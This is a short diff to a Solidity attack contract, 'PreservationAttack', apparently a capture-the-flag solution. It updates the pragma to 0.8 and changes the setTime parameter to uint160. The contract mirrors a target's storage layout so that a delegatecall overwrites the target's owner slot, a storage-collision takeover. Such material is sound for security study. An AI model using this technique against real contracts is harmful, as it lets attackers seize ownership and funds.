@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract PreservationAttack {
 
@@ -8,7 +8,7 @@ contract PreservationAttack {
   address slot1; 
   address ownerSlot;
 
-  function setTime(uint addressAsUint) public {
+  function setTime(uint160 addressAsUint) public {
     // Sets the owner
     ownerSlot = address(addressAsUint);
   }
